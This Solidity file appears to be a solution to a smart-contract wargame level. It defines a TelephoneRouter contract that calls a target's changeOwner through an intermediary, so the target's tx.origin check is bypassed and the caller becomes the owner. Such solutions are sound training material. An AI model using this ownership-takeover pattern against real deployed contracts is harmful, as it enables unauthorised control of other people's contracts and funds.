// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone{
  function changeOwner(address _owner) external;
}

contract TelephoneRouter{
    ITelephone tel;

    constructor(ITelephone _tel) public{
        tel = _tel;
    }

    function route() external {
        tel.changeOwner(msg.sender);
    }
}
